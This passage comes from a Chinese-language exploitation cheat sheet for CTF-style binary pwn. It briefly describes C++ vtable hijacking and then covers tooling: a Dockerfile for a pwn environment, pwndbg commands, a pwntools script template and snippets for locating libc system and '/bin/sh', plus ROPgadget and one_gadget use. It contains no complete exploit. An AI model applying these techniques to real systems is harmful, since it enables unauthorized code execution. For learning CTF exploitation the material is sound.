class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>p是一个A类的指针，p首先指向B的对象b，此时<code>b-&gt;__vptr</code>指向B的虚表，在虚表中查询对应函数地址即可找到真正调用的函数。内存中A，B，C三个类的虚表如下所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/10.png"></p>
<p>针对C++的pwn基本都是劫持虚表，但是虚表本身不可写，所以可以劫持一个对象指向虚表的虚表指针。目前有两种主要的攻击手法：伪造虚表，让类的虚表指针指向伪造的一个虚表，或者修改虚表指针指向其他类的虚表。</p>
<h1 id="0xA-Tools"><a href="#0xA-Tools" class="headerlink" title="0xA Tools"></a>0xA Tools</h1><h2 id="0xA0-Docker"><a href="#0xA0-Docker" class="headerlink" title="0xA0 Docker"></a>0xA0 Docker</h2><p>建议使用Docker搭建本地环境，方便调试程序，本人使用的docker环境的dockerfile如下(Ubuntu 18.04)，其中包含了后文中的大部分离线工具 </p>
<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">18.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y ca-certificates</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> sources.list /etc/apt/sources.list</span></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> pip.conf /root/.pip/pip.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> dpkg --add-architecture i386 &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get -y update &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt install -y \</span></span><br><span class="line"><span class="bash">    zsh \</span></span><br><span class="line"><span class="bash">    seccomp \</span></span><br><span class="line"><span class="bash">    libseccomp-dev \</span></span><br><span class="line"><span class="bash">    libc6:i386 \</span></span><br><span class="line"><span class="bash">    libc6-dbg:i386 \</span></span><br><span class="line"><span class="bash">    libc6-dbg \</span></span><br><span class="line"><span class="bash">    lib32stdc++6 \</span></span><br><span class="line"><span class="bash">    g++-multilib \</span></span><br><span class="line"><span class="bash">    cmake \</span></span><br><span class="line"><span class="bash">    ipython3 \</span></span><br><span class="line"><span class="bash">    upx-ucl \</span></span><br><span class="line"><span class="bash">    vim \</span></span><br><span class="line"><span class="bash">    net-tools \</span></span><br><span class="line"><span class="bash">    iputils-ping \</span></span><br><span class="line"><span class="bash">    libffi-dev \</span></span><br><span class="line"><span class="bash">    libssl-dev \</span></span><br><span class="line"><span class="bash">    python3-dev \</span></span><br><span class="line"><span class="bash">    python3-pip \</span></span><br><span class="line"><span class="bash">    python-pip \</span></span><br><span class="line"><span class="bash">    build-essential \</span></span><br><span class="line"><span class="bash">    ruby \</span></span><br><span class="line"><span class="bash">    ruby-dev \</span></span><br><span class="line"><span class="bash">    tmux \</span></span><br><span class="line"><span class="bash">    strace \</span></span><br><span class="line"><span class="bash">    ltrace \</span></span><br><span class="line"><span class="bash">    nasm \</span></span><br><span class="line"><span class="bash">    wget \</span></span><br><span class="line"><span class="bash">    radare2 \</span></span><br><span class="line"><span class="bash">    gdb \</span></span><br><span class="line"><span class="bash">    gdb-multiarch \</span></span><br><span class="line"><span class="bash">    netcat \</span></span><br><span class="line"><span class="bash">    socat \</span></span><br><span class="line"><span class="bash">    git \</span></span><br><span class="line"><span class="bash">    patchelf \</span></span><br><span class="line"><span class="bash">    gawk \</span></span><br><span class="line"><span class="bash">    file \</span></span><br><span class="line"><span class="bash">    tree \</span></span><br><span class="line"><span class="bash">    python3-distutils \</span></span><br><span class="line"><span class="bash">    bison --fix-missing &amp;&amp; \</span></span><br><span class="line"><span class="bash">    rm -rf /var/lib/apt/list/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip3 install --no-cache-dir --default-timeout=100 \</span></span><br><span class="line"><span class="bash">    ropgadget \</span></span><br><span class="line"><span class="bash">    pwntools \</span></span><br><span class="line"><span class="bash">    z3-solver \</span></span><br><span class="line"><span class="bash">    smmap2 \</span></span><br><span class="line"><span class="bash">    apscheduler \</span></span><br><span class="line"><span class="bash">    ropper \</span></span><br><span class="line"><span class="bash">    unicorn \</span></span><br><span class="line"><span class="bash">    keystone-engine \</span></span><br><span class="line"><span class="bash">    capstone \</span></span><br><span class="line"><span class="bash">    angr \</span></span><br><span class="line"><span class="bash">    pebble</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> gem sources --add https://mirrors.tuna.tsinghua.edu.cn/rubygems/ --remove https://rubygems.org/ &amp;&amp; \</span></span><br><span class="line"><span class="bash">    gem install one_gadget seccomp-tools &amp;&amp; rm -rf /var/lib/gems/2.*/cache/* </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/pwndbg/pwndbg &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> pwndbg &amp;&amp; chmod +x setup.sh &amp;&amp; ./setup.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/scwuaptx/Pwngdb.git /root/Pwngdb &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">cd</span> /root/Pwngdb &amp;&amp; cat /root/Pwngdb/.gdbinit  &gt;&gt; /root/.gdbinit &amp;&amp; \</span></span><br><span class="line"><span class="bash">    sed -i <span class="string">&quot;s?source ~/peda/peda.py?# source ~/peda/peda.py?g&quot;</span> /root/.gdbinit</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/niklasb/libc-database.git libc-database &amp;&amp; \</span></span><br><span class="line"><span class="bash">    <span class="built_in">echo</span> <span class="string">&quot;/libc-database/&quot;</span> &gt; ~/.libcdb_path</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> git <span class="built_in">clone</span> --depth 1 https://github.com/matrix1001/glibc-all-in-one glibc-all-in-one </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chsh -s $(<span class="built_in">which</span> zsh) &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> git://github.com/robbyrussell/oh-my-zsh.git ~/.oh-my-zsh &amp;&amp; \</span></span><br><span class="line"><span class="bash">    cp ~/.oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc &amp;&amp; \</span></span><br><span class="line"><span class="bash">    git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install pwntools --no-cache-dir &amp;&amp; \</span></span><br><span class="line"><span class="bash">    apt-get install -y locales &amp;&amp; \</span></span><br><span class="line"><span class="bash">    locale-gen en_US &amp;&amp; locale-gen en_US.UTF-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> LANG en_US.UTF-<span class="number">8</span>  </span><br><span class="line"><span class="keyword">ENV</span> LANGUAGE en_US:en  </span><br><span class="line"><span class="keyword">ENV</span> LC_ALL en_US.UTF-<span class="number">8</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="0xA1-IDA"><a href="#0xA1-IDA" class="headerlink" title="0xA1 IDA"></a>0xA1 IDA</h2><p>最常用的逆向工具，可以很方便的将汇编代码反编译为便于人类可读的伪代码。</p>
<h2 id="0xA2-GDB-amp-pwndbg"><a href="#0xA2-GDB-amp-pwndbg" class="headerlink" title="0xA2 GDB&amp;pwndbg"></a>0xA2 GDB&amp;pwndbg</h2><p>gdb为linux自带的程序调试工具，但是原生的gdb非常难用，因此可以安装pwndbg插件增强gdb的功能，安装方法如下所示，在前文的dockerfile中集成了pwndbg。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure>



<p>pwndbd文档为<a target="_blank" rel="noopener" href="https://browserpwndbg.readthedocs.io/en/docs/">https://browserpwndbg.readthedocs.io/en/docs/</a>。常用的pwndbg命令如下。</p>
<table>
<thead>
<tr>
<th align="center">命令</th>
<th align="center">解释</th>
</tr>
</thead>
<tbody><tr>
<td align="center">set args xxxx xxxx</td>
<td align="center">设置程序的args为xxxx和xxxx</td>
</tr>
<tr>
<td align="center">vmmap</td>
<td align="center">查看程序的所有地址</td>
</tr>
<tr>
<td align="center">run</td>
<td align="center">直接执行程序</td>
</tr>
<tr>
<td align="center">start</td>
<td align="center">从头开始执行程序，相当于在第一行代码处下断点并且开始执行，通常这不会从main函数开始执行，而是libc中的start</td>
</tr>
<tr>
<td align="center">b *0xxxxxxxx</td>
<td align="center">在地址0xxxxxxxx处下断点</td>
</tr>
<tr>
<td align="center">b main</td>
<td align="center">在main函数的开始处下断点</td>
</tr>
<tr>
<td align="center">b func+10</td>
<td align="center">在func+10处下断点</td>
</tr>
<tr>
<td align="center">b func+10 if i == 1</td>
<td align="center">条件断点，gdb必须可以找到变量i</td>
</tr>
<tr>
<td align="center">d breakpoints</td>
<td align="center">删除所有断点</td>
</tr>
<tr>
<td align="center">d breakpoints 1</td>
<td align="center">删除编号为1的断点</td>
</tr>
<tr>
<td align="center">i breakpoints</td>
<td align="center">查看所有断点</td>
</tr>
<tr>
<td align="center">i functions</td>
<td align="center">查看程序目前所有的函数名称与地址</td>
</tr>
<tr>
<td align="center">attach 123</td>
<td align="center">挂载到进程号123的程序，通常和pwntools配合使用</td>
</tr>
<tr>
<td align="center">stack</td>
<td align="center">查看栈上的东西</td>
</tr>
<tr>
<td align="center">regs</td>
<td align="center">查看目前所有寄存器的值</td>
</tr>
<tr>
<td align="center">got</td>
<td align="center">查看got表的信息</td>
</tr>
<tr>
<td align="center">plt</td>
<td align="center">查看plt表的信息</td>
</tr>
<tr>
<td align="center">heap</td>
<td align="center">查看堆上的chunk</td>
</tr>
<tr>
<td align="center">heap_info</td>
<td align="center">查看heap_info的信息</td>
</tr>
<tr>
<td align="center">arena</td>
<td align="center">查看所有arena的信息</td>
</tr>
<tr>
<td align="center">bins</td>
<td align="center">查看所有bin的信息</td>
</tr>
<tr>
<td align="center">tcache</td>
<td align="center">查看tcache的信息</td>
</tr>
<tr>
<td align="center">fastbins</td>
<td align="center">查看fastbins所有的chunk</td>
</tr>
<tr>
<td align="center">smallbins</td>
<td align="center">查看smallbins所有的chunk</td>
</tr>
<tr>
<td align="center">largebins</td>
<td align="center">查看largebins所有的chunk</td>
</tr>
<tr>
<td align="center">unsortedbin</td>
<td align="center">查看unsortedbin的所有chunk</td>
</tr>
<tr>
<td align="center">top_chunk</td>
<td align="center">查看top chunk的信息</td>
</tr>
<tr>
<td align="center">x/20xw 0xxxxx</td>
<td align="center">以十六进制，4字节为单位打印20个该地址保存的值，32位程序常用</td>
</tr>
<tr>
<td align="center">x/20xh 0xxxxx</td>
<td align="center">以十六进制，2字节为单位打印20个该地址保存的值</td>
</tr>
<tr>
<td align="center">x/20xg 0xxxxx</td>
<td align="center">以十六进制，8字节为单位打印20个该地址保存的值，64位程序常用</td>
</tr>
<tr>
<td align="center">x/20i 0xxxxx</td>
<td align="center">将该地址保存的值解析为指令打印20条</td>
</tr>
<tr>
<td align="center">x/20s 0xxxxx</td>
<td align="center">将改地址保存的值解析为字符串打印20个</td>
</tr>
<tr>
<td align="center">rop</td>
<td align="center">等同用使用ropgadget</td>
</tr>
<tr>
<td align="center">ropper</td>
<td align="center">等同于使用ropper</td>
</tr>
<tr>
<td align="center">checksec</td>
<td align="center">等同于使用checksec，该命令来自pwntools</td>
</tr>
<tr>
<td align="center">canary</td>
<td align="center">打印当前栈上的canary</td>
</tr>
<tr>
<td align="center">retaddr</td>
<td align="center">打印当前站上的ret地址</td>
</tr>
<tr>
<td align="center">distance 0xxxxx 0xxxxx</td>
<td align="center">计算两个地址之间的距离</td>
</tr>
<tr>
<td align="center">cyclic 10</td>
<td align="center">生成10个字节junk data，生成的junk data是有规律的，例如aaabaaacaaad等等，该命令来自pwntools</td>
</tr>
</tbody></table>
<h2 id="0xA3-pwntools"><a href="#0xA3-pwntools" class="headerlink" title="0xA3 pwntools"></a>0xA3 pwntools</h2><p>是一个专门为pwn而生的python库，其中集成了很多非常友好的pwn相关的API以及利用方法，很多手工利用很复杂的方法在pwntools中只需要一个函数就可以。</p>
<p>安装pwntools。在前文的dockerfile中集成了python2和python3的pwntools。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python3</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python3 -m pip install --upgrade pip</span><br><span class="line">python3 -m pip install --upgrade pwntools</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">apt-get update</span><br><span class="line">apt-get install python python-pip python-dev git libssl-dev libffi-dev build-essential</span><br><span class="line">python2 -m pip install --upgrade pip==20.3.4</span><br><span class="line">python2 -m pip install --upgrade pwntools</span><br></pre></td></tr></table></figure>



<p>下面是一个比较常用的pwntools脚本框架。若该脚本接收了参数，则会启动远程连接，否则仅为本地测试。可以根据<code>context.clear(arch=&#39;amd64&#39;)</code>来指定程序是否为64位，根据<code>context.update(log_level=&#39;debug&#39;)</code>来指定是否开启debug模式，根据<code>libc = ELF(&#39;./libc6_2.27-3ubuntu1.2_amd64.so&#39;)</code>来指定需要使用的libc文件，此外，pg是一个payload生成器，也就是cyclic，例如<code>pg.get(8)</code>会得到字符串<code>aaaaaaab</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;xxx.xxx.xxx.xxx&#x27;</span></span><br><span class="line">PORT = xxxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.clear(arch=&#x27;amd64&#x27;)</span></span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>一些常用的pwntools功能。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pause()  <span class="comment"># 暂停程序执行，在send数据之前暂停才有效，通常用来暂停程序执行等到用gdb进行attach</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send and recv.</span></span><br><span class="line">conn.sendline(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">line = conn.recvline()</span><br><span class="line">conn.sendlineafter(<span class="string">&#x27;Name : &#x27;</span>, <span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">data = conn.recvall()</span><br><span class="line">data = conn.recv(<span class="number">10</span>)  <span class="comment"># recv 10 bytes data.</span></span><br><span class="line">conn.recvuntil(<span class="string">&#x27;Name : &#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Auto create a new window and attach to gdb</span></span><br><span class="line">gdb.attach(conn)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0x800000</span>)  <span class="comment"># 64-bits int to string, return 8 bytes string.</span></span><br><span class="line">payload = p32(<span class="number">0x800000</span>)  <span class="comment"># 32-bits int to string, return 4 bytes string.</span></span><br><span class="line">data = u64(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 64-bits string to int.</span></span><br><span class="line">data = u32(<span class="string">&#x27;\x00\x00\xff\xff&#x27;</span>)  <span class="comment"># 32-bits string to int.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Write asm.</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">mov eax,1;</span></span><br><span class="line"><span class="string">push eax;</span></span><br><span class="line"><span class="string">pop eax;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line">conn.send(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get libc offset.</span></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment"># Get address of the string /bin/sh&quot; from libc.</span></span><br><span class="line">str_bin_sh = libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get plt or got address of a function.</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="0xA4-checksec"><a href="#0xA4-checksec" class="headerlink" title="0xA4 checksec"></a>0xA4 checksec</h2><p>用来对一个二进制程序进行安全检查，检查是否开启常用的安全措施，实际上该程序是一个属于pwntools的python脚本。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/9.png"></p>
<h2 id="0xA5-asm-online"><a href="#0xA5-asm-online" class="headerlink" title="0xA5 asm online"></a>0xA5 asm online</h2><p>一个可以在线编写汇编并且编译为hex字符串的<a target="_blank" rel="noopener" href="https://defuse.ca/online-x86-assembler.htm#disassembly">网站</a>，支持x86与x64，很方便编写和检查shellcode，不过pwntools中集成了便携asm的api。</p>
<h2 id="0xA6-libc-database"><a href="#0xA6-libc-database" class="headerlink" title="0xA6 libc-database"></a>0xA6 libc-database</h2><p>一个可以根据程序泄漏出的libc函数地址与函数名查询libc版本的<a target="_blank" rel="noopener" href="https://libc.rip/">在线网站</a>。同时，<a target="_blank" rel="noopener" href="https://github.com/niklasb/libc-database">libc-database</a>还是一个离线数据库，包含了几乎所有的libc版本，并且提供了方便的查询接口，但是该离线数据库非常大。以及<a target="_blank" rel="noopener" href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a>也是一个具有同样功能的离线数据库。</p>
<p>安装libc-database，用get就可以自动下载所有的ubuntu的libc数据库到db目录下，通过find就可以直接根据函数名和后三个16进制的偏移识别对应的libc。前文中的dockerfile集成了libc-database，但是没有下载任何数据库，下载的libc数据库通常会达到好几个g。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line">./get</span><br><span class="line">./find <span class="built_in">printf</span> 260 puts f30</span><br></pre></td></tr></table></figure>



<h2 id="0xA7-ROPgadgets"><a href="#0xA7-ROPgadgets" class="headerlink" title="0xA7 ROPgadgets"></a>0xA7 ROPgadgets</h2><p>检查一个elf文件中的所有gadgets，包括rop，jop以及cop的gadgets。安装ropgadgets，在前文的dockerfile中集成了ropgadgets。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install capstone</span><br><span class="line">pip install ropgadget</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">usage: ROPgadget.py [-h] [-v] [-c] [--binary &lt;binary&gt;] [--opcode &lt;opcodes&gt;]</span><br><span class="line">                    [--string &lt;string&gt;] [--memstr &lt;string&gt;] [--depth &lt;nbyte&gt;]</span><br><span class="line">                    [--only &lt;key&gt;] [--filter &lt;key&gt;] [--range &lt;start-end&gt;]</span><br><span class="line">                    [--badbytes &lt;byte&gt;] [--rawArch &lt;arch&gt;] [--rawMode &lt;mode&gt;]</span><br><span class="line">                    [--rawEndian &lt;endian&gt;] [--re &lt;re&gt;] [--offset &lt;hexaddr&gt;]</span><br><span class="line">                    [--ropchain] [--thumb] [--console] [--norop] [--nojop]</span><br><span class="line">                    [--callPreceded] [--nosys] [--multibr] [--all] [--noinstr]</span><br><span class="line">                    [--dump] [--silent] [--align ALIGN]</span><br><span class="line"></span><br><span class="line">optional arguments:</span><br><span class="line">    -h, --help           show this help message and exit</span><br><span class="line">    -v, --version        Display the ROPgadget&#39;s version</span><br><span class="line">    -c, --checkUpdate    Checks if a new version is available</span><br><span class="line">    --binary &lt;binary&gt;    Specify a binary filename to analyze</span><br><span class="line">    --opcode &lt;opcodes&gt;   Search opcode in executable segment</span><br><span class="line">    --string &lt;string&gt;    Search string in readable segment</span><br><span class="line">    --memstr &lt;string&gt;    Search each byte in all readable segment</span><br><span class="line">    --depth &lt;nbyte&gt;      Depth for search engine (default 10)</span><br><span class="line">    --only &lt;key&gt;         Only show specific instructions</span><br><span class="line">    --filter &lt;key&gt;       Suppress specific mnemonics</span><br><span class="line">    --range &lt;start-end&gt;  Search between two addresses (0x...-0x...)</span><br><span class="line">    --badbytes &lt;byte&gt;    Rejects specific bytes in the gadget&#39;s address</span><br><span class="line">    --rawArch &lt;arch&gt;     Specify an arch for a raw file</span><br><span class="line">    --rawMode &lt;mode&gt;     Specify a mode for a raw file</span><br><span class="line">    --rawEndian &lt;endian&gt; Specify an endianness for a raw file</span><br><span class="line">    --re &lt;re&gt;            Regular expression</span><br><span class="line">    --offset &lt;hexaddr&gt;   Specify an offset for gadget addresses</span><br><span class="line">    --ropchain           Enable the ROP chain generation</span><br><span class="line">    --thumb              Use the thumb mode for the search engine (ARM only)</span><br><span class="line">    --console            Use an interactive console for search engine</span><br><span class="line">    --norop              Disable ROP search engine</span><br><span class="line">    --nojop              Disable JOP search engine</span><br><span class="line">    --callPreceded       Only show gadgets which are call-preceded</span><br><span class="line">    --nosys              Disable SYS search engine</span><br><span class="line">    --multibr            Enable multiple branch gadgets</span><br><span class="line">    --all                Disables the removal of duplicate gadgets</span><br><span class="line">    --noinstr            Disable the gadget instructions console printing</span><br><span class="line">    --dump               Outputs the gadget bytes</span><br><span class="line">    --silent             Disables printing of gadgets during analysis</span><br><span class="line">    --align ALIGN        Align gadgets addresses (in bytes)</span><br><span class="line">    --mipsrop &lt;rtype&gt;    MIPS useful gadgets finder</span><br><span class="line">                         stackfinder|system|tails|lia0|registers</span><br></pre></td></tr></table></figure>



<p>如下图所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/11.png"></p>
<h2 id="0xA8-one-gadget"><a href="#0xA8-one-gadget" class="headerlink" title="0xA8 one_gadget"></a>0xA8 one_gadget</h2><p>检查一个libc中是否有one gadget。所谓one gadget指的是通过一个gadget，满足某种约束（例如寄存器中某个值）即可直接getshell。安装one_gadget如下。前文中的dockerfile集成了one_gadget。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt -y install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>



<p>如下图所示。</p>
<p><img src="/2021/08/14/StackOverflow-CheatSheet/12.png"></p>
<p>以上图第2个one gadget为例，若可以满足rsp+0x40为0，则直接跳转到libc中的0x4f3c2偏移就可以调用execve来get shell。需要注意的是使用one gadget必须要先知道libc的基址。</p>
